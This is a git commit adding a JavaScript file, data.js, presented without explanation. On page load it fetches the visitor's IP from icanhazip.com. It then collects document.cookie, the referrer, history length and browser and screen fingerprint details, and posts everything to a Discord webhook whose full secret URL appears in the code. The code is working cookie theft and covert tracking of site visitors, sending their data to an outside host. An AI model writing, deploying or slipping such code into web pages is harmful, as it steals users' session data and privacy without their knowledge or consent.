3981153cc651b6b7f394487ce521070810251d72
Andrew Lee <ajlee2006@gmail.com>
2022-01-02 15:46:31 +0800

    Create data.js

---
+++ codes/data.js
@@ -0,0 +1,15 @@
+var ip = new XMLHttpRequest();
+ip.open("GET","http://icanhazip.com/",false);
+ip.send(null);
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "https://discord.com/api/webhooks/926855926881861662/w01BN9-fwIPZXJZ3QjGWzCrJwvwMkV7bnhbVuYsj5grfYK8Fg596_qtJ8bCeUAkoEUzU", true);
+xhr.setRequestHeader('Content-Type', 'application/json');
+xhr.send(JSON.stringify({
+    "content": "Data from " + window.location.href + " " + ip.responseText + "\n" + 
+      [new Date(), document.referrer, history.length,
+       navigator.appName, navigator.product, navigator.appVersion, navigator.userAgent, navigator.language, navigator.onLine, navigator.platform, navigator.javaEnabled(), navigator.cookieEnabled,
+       document.cookie, decodeURIComponent(document.cookie.split(";")),
+       screen.width, screen.height, document.width, document.height, innerWidth, innerHeight, screen.availWidth, screen.availHeight, screen.colorDepth, screen.pixelDepth].join("\n")
+}));
+
+// time opened, referrer, previous sites, browser name, browser engine, browser version, browser version 2, language, browser online, browser platform, java enableed, data cookies enabled, data cookies, data cookies 2, screen width, screen height, document width, document height, inner width, inner height, avail width, avail height, color depth, pixel depth
